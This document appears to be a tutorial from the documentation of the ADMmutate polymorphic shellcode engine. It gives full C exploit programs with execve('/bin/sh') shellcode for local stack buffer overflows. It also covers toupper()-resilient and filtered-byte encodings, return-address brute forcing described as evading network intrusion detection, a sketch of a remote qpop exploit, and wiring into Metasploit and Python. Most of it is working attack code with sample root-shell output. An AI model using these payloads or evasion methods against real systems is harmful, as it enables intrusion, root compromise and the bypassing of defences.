# Examples and Tutorials

This document provides real-world examples and tutorials for using ADMmutate in various scenarios.


## Example 1: Basic Local Exploit

### Scenario
Exploiting a simple stack-based buffer overflow in a local program.


### Code: exploit1.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "ADMmutapi.h"

#define SIZE 1204
#define NOP_SIZE 700
#define RET_ADDR 0xbffff500

// execve("/bin/sh") shellcode for Linux x86
char shellcode[] = 
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc, char *argv[]) {
    char buffer[SIZE];
    struct morphctl mut;
    int nop = NOP_SIZE;
    int i;
    
    // Initialize mutation control
    mut.upper = 0;
    mut.lower = 0;
    mut.banned = NULL;
    mut.arch = IA32;
    
    // Initialize mutation engine
    if (init_mutate(&mut) != 0) {
        fprintf(stderr, "Failed to initialize mutation engine\n");
        return 1;
    }
    
    // Prepare buffer: NOPs + shellcode + return addresses
    memset(buffer, 0x90, SIZE);
    memcpy(buffer + nop, shellcode, strlen(shellcode));
    
    // Fill return addresses
    for (i = nop + strlen(shellcode); i < SIZE - 4; i += 4) {
        *(unsigned long *)(buffer + i) = RET_ADDR;
    }
    
    // Apply mutations
    apply_key(buffer, strlen(shellcode), nop, &mut);
    apply_jnops(buffer, nop, mut);
    apply_engine(buffer, strlen(shellcode), nop, mut);
    
    // Output the polymorphic buffer
    write(STDOUT_FILENO, buffer, SIZE);
    
    return 0;
}
```

### Build and Run

```bash
# Compile the exploit
gcc -o exploit1 exploit1.c ADMmuteng.o -DLINUX

# Generate mutated payload and test
./vulnerable `./exploit1`
```

**Expected Result:**
```
sh-2.03# id
uid=0(root) gid=0(root) groups=0(root)
sh-2.03# exit
```

---

## Example 2: toupper() Resilient Shellcode

### Scenario
Target application converts input to uppercase before processing (e.g., HTTP headers, command-line arguments).


### Code: exploit2.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include "ADMmutapi.h"

#define SIZE 1024
#define NOP_SIZE 600

char shellcode[] = 
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
    char buffer[SIZE];
    struct morphctl mut;
    int i;
    
    // Configure for toupper() resilience
    mut.upper = 1;  // Enable toupper() mode
    mut.lower = 0;
    mut.banned = NULL;
    mut.arch = IA32;
    
    init_mutate(&mut);
    
    // Prepare buffer
    memset(buffer, 0x90, SIZE);
    memcpy(buffer + NOP_SIZE, shellcode, strlen(shellcode));
    
    // Apply mutations with toupper() constraint
    if (apply_key(buffer, strlen(shellcode), NOP_SIZE, &mut) != 0) {
        fprintf(stderr, "Could not find toupper()-compliant key\n");
        return 1;
    }
    
    apply_jnops(buffer, NOP_SIZE, mut);
    apply_engine(buffer, strlen(shellcode), NOP_SIZE, mut);
    
    // Simulate toupper() transformation
    printf("Before toupper():\n");
    for (i = 0; i < 20; i++) {
        printf("%02x ", (unsigned char)buffer[i]);
    }
    printf("\n");
    
    // Apply toupper() like the target would
    for (i = 0; i < SIZE; i++) {
        buffer[i] = toupper(buffer[i]);
    }
    
    printf("After toupper():\n");
    for (i = 0; i < 20; i++) {
        printf("%02x ", (unsigned char)buffer[i]);
    }
    printf("\n");
    
    // Shellcode should still be valid!
    write(STDOUT_FILENO, buffer, SIZE);
    
    return 0;
}
```

**Key Points:**
- Set `mut.upper = 1` to enable toupper() resilience
- Only uppercase-safe instructions are used
- Encoder key is chosen to produce uppercase-safe output
- Decoder works even after toupper() transformation

---

## Example 3: Banned Characters

### Scenario
Input filtering removes or corrupts certain bytes (NULL, newlines, etc.).

```mermaid
%%{init: {'theme':'base', 'themeVariables': {'primaryColor':'#1a1a2e','primaryTextColor':'#fff'}}}%%
graph TD
    A[Application Filter] --> B{Scans Input}
    
    B --> C[NULL bytes 0x00]
    B --> D[Newline 0x0a]
    B --> E[Carriage Return 0x0d]
    B --> F[Custom chars]
    
    C -->|Found| G[❌ Reject or Strip]
    D -->|Found| G
    E -->|Found| G
    F -->|Found| G
    
    C -->|Not found| H[✅ Pass Through]
    D -->|Not found| H
    E -->|Not found| H
    F -->|Not found| H
    
    style G fill:#e94560,stroke:#c72c48,color:#fff
    style H fill:#388e3c,stroke:#2e7d32,color:#fff
```



### Code: exploit3.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "ADMmutapi.h"

#define SIZE 1024
#define NOP_SIZE 500

char shellcode[] = 
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\xb0\x0b\xcd\x80";

int verify_no_banned(char *buf, int len, char *banned) {
    int i, j;
    for (i = 0; i < len; i++) {
        for (j = 0; banned[j]; j++) {
            if (buf[i] == banned[j]) {
                fprintf(stderr, "Found banned char 0x%02x at offset %d\n", 
                        (unsigned char)banned[j], i);
                return 0;
            }
        }
    }
    return 1;
}

int main() {
    char buffer[SIZE];
    struct morphctl mut;
    char banned_chars[] = "\x00\x0a\x0d\x20";  // NULL, LF, CR, SPACE
    
    // Configure with banned characters
    mut.upper = 0;
    mut.lower = 0;
    mut.banned = banned_chars;  // Set banned characters
    mut.arch = IA32_SLIDE;      // Use sliding keys for more options
    
    init_mutate(&mut);
    
    memset(buffer, 0x90, SIZE);
    memcpy(buffer + NOP_SIZE, shellcode, strlen(shellcode));
    
    // Apply mutations avoiding banned chars
    if (apply_key(buffer, strlen(shellcode), NOP_SIZE, &mut) != 0) {
        fprintf(stderr, "Could not find key avoiding banned chars\n");
        return 1;
    }
    
    apply_jnops(buffer, NOP_SIZE, mut);
    apply_engine(buffer, strlen(shellcode), NOP_SIZE, mut);
    
    // Verify no banned characters in output
    if (verify_no_banned(buffer, SIZE, banned_chars)) {
        fprintf(stderr, "✅ No banned characters found!\n");
    } else {
        fprintf(stderr, "❌ Banned characters detected!\n");
        return 1;
    }
    
    write(STDOUT_FILENO, buffer, SIZE);
    return 0;
}
```

**Banned Character Strategy:**

| Situation | Solution |
|-----------|----------|
| Few banned chars (1-5) | Standard keyspace usually sufficient |
| Many banned chars (5-20) | Use `IA32_SLIDE` for larger keyspace |
| Extreme filtering (20+) | May need to relax constraints or pre-encode shellcode |

---

## Example 4: C Array Output for Integration

### Scenario
You want to integrate polymorphic shellcode into a C source file or framework.


### Usage

```bash
# Generate C array format
./m7 -i -c -o 0xbffff67e -n 0x90 -x ./exp > payload.c

# View the output
cat payload.c
```

**Output Format:**
```c
/* Generated by ADMmutate m7 */
char shellcode[] = {
    0x42, 0x27, 0x40, 0x4c, 0x44, 0x45, 0x49, 0x43,
    0x45, 0x4b, 0x49, 0x27, 0x4b, 0xb3, 0x48, 0x45,
    /* ... continues ... */
    0x7e, 0xbf, 0xbf, 0xbf, 0x7e, 0xbf, 0xbf, 0xbf
};
unsigned int shellcode_len = 1205;
```

### Integration Example

```c
#include <stdio.h>
#include <string.h>

// Include the generated payload
#include "payload.c"

int main() {
    void (*func)() = (void(*)())shellcode;
    
    printf("Executing %d bytes of polymorphic shellcode...\n", 
           shellcode_len);
    
    func();  // Execute!
    
    return 0;
}
```

---

## Example 5: Offset Modulation

### Scenario
Brute-forcing return address offsets for remote exploitation.


### Code: exploit5.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "ADMmutapi.h"

#define SIZE 1024
#define NOP_SIZE 600
#define RET_SIZE 400
#define RET_OFFSET (NOP_SIZE + 24)  // After shellcode

char shellcode[] = 
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\xb0\x0b\xcd\x80";

void generate_variant(char *buffer, unsigned long base_ret) {
    struct morphctl mut;
    int i;
    
    mut.upper = 0;
    mut.lower = 0;
    mut.banned = "\x00";
    mut.arch = IA32;
    mut.omodulate = 1;  // Enable offset modulation
    
    init_mutate(&mut);
    
    // Prepare buffer
    memset(buffer, 0x90, SIZE);
    memcpy(buffer + NOP_SIZE, shellcode, strlen(shellcode));
    
    // Fill return addresses
    for (i = 0; i < RET_SIZE; i += 4) {
        *(unsigned long *)(buffer + RET_OFFSET + i) = base_ret;
    }
    
    // Apply mutations
    apply_key(buffer, strlen(shellcode), NOP_SIZE, &mut);
    apply_jnops(buffer, NOP_SIZE, mut);
    apply_engine(buffer, strlen(shellcode), NOP_SIZE, mut);
    
    // Modulate return addresses for variance
    apply_offset_mod(buffer, RET_SIZE, RET_OFFSET, mut);
}

int main() {
    char buffer[SIZE];
    unsigned long base_return = 0xbffff500;
    int attempt;
    
    // Generate 10 variants with different offset modulation
    for (attempt = 0; attempt < 10; attempt++) {
        fprintf(stderr, "Generating variant %d...\n", attempt + 1);
        
        generate_variant(buffer, base_return);
        
        // In real exploit, send buffer to target here
        // For demo, just write to file
        char filename[64];
        sprintf(filename, "variant_%d.bin", attempt + 1);
        FILE *f = fopen(filename, "wb");
        fwrite(buffer, 1, SIZE, f);
        fclose(f);
    }
    
    fprintf(stderr, "✅ Generated 10 unique variants\n");
    return 0;
}
```

**Benefits of Offset Modulation:**
- Each attempt has a unique return address pattern
- Increases chance of hitting valid stack address
- Evades pattern-based NIDS detection
- Useful for blind exploitation scenarios

---

## Example 6: Multi-Architecture Support

### Scenario
Targeting different architectures with the same codebase.


### Code: multiarch.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "ADMmutapi.h"

void mutate_for_arch(int arch, char *arch_name, char *shellcode, int sc_len) {
    char buffer[2048];
    struct morphctl mut;
    int nop_size = 800;
    
    fprintf(stderr, "\n=== Mutating for %s ===\n", arch_name);
    
    mut.upper = 0;
    mut.lower = 0;
    mut.banned = "\x00";
    mut.arch = arch;
    
    if (init_mutate(&mut) != 0) {
        fprintf(stderr, "Failed to initialize for %s\n", arch_name);
        return;
    }
    
    fprintf(stderr, "Available junks: %d\n", mut.junk_pads);
    fprintf(stderr, "Decoder instructions: %d\n", mut.decoder_instructions);
    
    memset(buffer, 0x90, sizeof(buffer));
    memcpy(buffer + nop_size, shellcode, sc_len);
    
    if (apply_key(buffer, sc_len, nop_size, &mut) != 0) {
        fprintf(stderr, "Key application failed\n");
        return;
    }
    
    apply_jnops(buffer, nop_size, mut);
    apply_engine(buffer, sc_len, nop_size, mut);
    
    fprintf(stderr, "✅ Successfully generated %s payload\n", arch_name);
    
    // Save to file
    char filename[64];
    sprintf(filename, "payload_%s.bin", arch_name);
    FILE *f = fopen(filename, "wb");
    fwrite(buffer, 1, sizeof(buffer), f);
    fclose(f);
}

int main() {
    // Example shellcode (this should be architecture-specific in practice)
    char ia32_shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68...";
    
    // Generate for different architectures
    mutate_for_arch(IA32, "IA32", ia32_shellcode, strlen(ia32_shellcode));
    mutate_for_arch(IA32_SLIDE, "IA32_SLIDE", ia32_shellcode, strlen(ia32_shellcode));
    
    #ifdef SPARC_SHELLCODE
    mutate_for_arch(SPARC, "SPARC", sparc_shellcode, strlen(sparc_shellcode));
    #endif
    
    #ifdef HPPA_SHELLCODE
    mutate_for_arch(HPPA, "HPPA", hppa_shellcode, strlen(hppa_shellcode));
    #endif
    
    return 0;
}
```

---

## Example 7: Remote Exploitation

### Using the qp.c Example

The included `qp.c` demonstrates remote exploitation of a qpop vulnerability.


### Key Concepts from qp.c

```c
// Simplified from qp.c
int exploit_qpop(char *target) {
    char buffer[EVIL_BUF];
    struct morphctl mut;
    int sock;
    
    // Configure mutation
    mut.arch = IA32;
    mut.banned = "\x00\x0a\x0d";  // Avoid protocol chars
    init_mutate(&mut);
    
    // Build exploit buffer
    build_exploit_buffer(buffer);
    
    // Apply mutations
    apply_key(buffer, SHELLCODE_LEN, NOP_OFFSET, &mut);
    apply_jnops(buffer, NOP_OFFSET, mut);
    apply_engine(buffer, SHELLCODE_LEN, NOP_OFFSET, mut);
    
    // Send to target
    sock = connect_to_target(target, 110);
    send_exploit(sock, buffer);
    
    return check_shell(sock);
}
```

---

## Performance Benchmarks

### Key Search Performance

```mermaid
%%{init: {'theme':'dark'}}%%
graph LR
    A[Constraints] --> B{Complexity}
    
    B -->|None| C[~0.01s<br/>⚡ Instant]
    B -->|Banned chars| D[~0.1s<br/>🔥 Fast]
    B -->|upper OR lower| E[~0.5s<br/>⏱️ Moderate]
    B -->|upper AND lower| F[~2-5s<br/>⏳ Slow]
    B -->|Many banned| G[~10s+<br/>🐌 Very Slow]
    
    style C fill:#388e3c,stroke:#2e7d32,color:#fff
    style D fill:#16a085,stroke:#0d7a5f,color:#fff
    style E fill:#d68910,stroke:#b87333,color:#fff
    style F fill:#e94560,stroke:#c72c48,color:#fff
    style G fill:#6b2c2c,stroke:#8b3a3a,color:#fff
```



### Optimization Tips

1. **Use IA32_SLIDE** for tight constraints (64-bit keyspace vs 32-bit)
2. **Minimize banned characters** - only ban truly problematic bytes
3. **Choose upper OR lower**, not both
4. **Pre-validate shellcode** - ensure it doesn't contain banned chars
5. **Cache valid keys** for repeated use (not implemented, but possible)

---

## Integration Examples

### With Metasploit Framework

```ruby
# Pseudo-code for Metasploit module
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  def exploit
    # Generate polymorphic payload
    mutated = generate_admmutate_payload(payload.encoded)
    
    # Send to target
    send_request_cgi({
      'method' => 'POST',
      'data' => mutated
    })
  end
  
  def generate_admmutate_payload(shellcode)
    # Call m7 or link to ADMmuteng.o
    IO.popen("./m7 -i -o #{target_offset} -n 0x90", "r+") do |pipe|
      pipe.write(shellcode)
      pipe.close_write
      return pipe.read
    end
  end
end
```

### With Python (via subprocess)

```python
import subprocess

def mutate_payload(shellcode, arch='IA32', banned=None):
    """
    Generate polymorphic shellcode using ADMmutate
    """
    args = ['./m7', '-i', '-o', '0xbffff000', '-n', '0x90']
    
    if banned:
        # Would need to modify m7 to accept -b flag
        pass
    
    proc = subprocess.Popen(args, stdin=subprocess.PIPE, 
                           stdout=subprocess.PIPE)
    mutated, _ = proc.communicate(shellcode)
    
    return mutated

# Usage
original = b"\x31\xc0\x50\x68..."
polymorphic = mutate_payload(original)
send_to_target(polymorphic)
```

---

## Debugging Tips

### Viewing Generated Decoder

```bash
# Generate and disassemble
./m7 -i -o 0xbffff67e -n 0x90 -x ./exp > payload.bin
objdump -D -b binary -m i386 -M intel payload.bin | less
```

### Comparing Mutations

```bash
# Generate multiple versions
for i in {1..5}; do
    ./m7 -i -o 0xbffff67e -n 0x90 -x ./exp > variant$i.bin
done

# Compare them
diff <(xxd variant1.bin) <(xxd variant2.bin)
```

### Testing in GDB

```bash
# Load vulnerable program
gdb ./vulnerable

# Generate payload
./exp | ./m7 -i -o 0xbffff63e -n 0x90 > /tmp/payload

# In GDB
(gdb) run `cat /tmp/payload`
(gdb) x/20i $eip  # Examine instructions at crash point
```

---

**Previous**: [API Reference](API_REFERENCE.md) | **Home**: [README](../README.md)
